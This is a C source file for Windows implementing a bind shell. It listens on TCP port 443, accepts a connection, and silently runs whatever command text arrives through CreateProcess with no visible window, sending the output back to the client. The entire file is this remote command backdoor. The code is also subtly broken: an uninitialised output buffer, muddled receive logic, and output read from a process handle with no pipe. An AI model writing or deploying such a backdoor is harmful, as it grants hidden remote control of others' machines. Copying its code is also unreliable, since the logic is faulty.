#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#define DEFAULT_PORT 443
#define BUFFER_SIZE 1024

// Function to log messages
void log_message(const char* message) {
    fprintf(stderr, "%s\n", message);
}

// Function to create and configure the socket
SOCKET create_socket() {
    // Initialize WinSock library
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        log_message("Failed to initialize WinSock.");
        return INVALID_SOCKET;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        log_message("Failed to create socket.");
        WSACleanup();
        return INVALID_SOCKET;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind the socket to the specified IP and port
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        log_message("Failed to bind the socket.");
        closesocket(serverSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Listen for incoming connections
    if (listen(serverSocket, SOMAXCONN) == -1) {
        log_message("Failed to listen for connections.");
        closesocket(serverSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    printf("Listening on port %d...\n", DEFAULT_PORT);
    return serverSocket;
}

int main(int argc, const char *argv[]) {
    SOCKET serverSocket = create_socket();
    if (serverSocket == INVALID_SOCKET) {
        exit(EXIT_FAILURE);
    }

    // Accept a client connection
    struct sockaddr_in clientAddr;
    int clientSize = sizeof(clientAddr);
    SOCKET clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);
    if (clientSocket == INVALID_SOCKET) {
        log_message("Failed to accept client connection.");
        closesocket(serverSocket);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
    printf("Accepted client connection from: %s:%d\n", inet_ntoa(clientAddr.sin_addr),
           ntohs(clientAddr.sin_port));

    STARTUPINFO startupInfo = {sizeof(startupInfo)};
    PROCESS_INFORMATION processInfo;

    while (TRUE) {
        char command[BUFFER_SIZE] = "cmd.exe ";
        char response[BUFFER_SIZE * 8 + 1];
        DWORD bytesRead = 0;

        // Receive data from the client
        if (recv(clientSocket, command, sizeof(command) - 1, MSG_PEEK | MSG_WAITALL) > 0) {
            recv(clientSocket, command, strlen(command), 0);
        } else {
            continue; // Connection closed by client
        }

        // Execute the received command using CreateProcess
        if (!CreateProcess(NULL, command, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
            log_message("Failed to execute command.");
            break;
        }

        // Read the output of the executed command
        char buffer[BUFSIZ];
        while (ReadFile(processInfo.hProcess, buffer, sizeof(buffer) - 1, &bytesRead, NULL) &&
               bytesRead > 0) {
            buffer[bytesRead] = '\0';
            strcat(response, buffer);
        }

        // Send the command output back to the client
        send(clientSocket, response, strlen(response), 0);
        CloseHandle(processInfo.hThread);
        CloseHandle(processInfo.hProcess);
    }

    // Clean up resources
    closesocket(serverSocket);
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}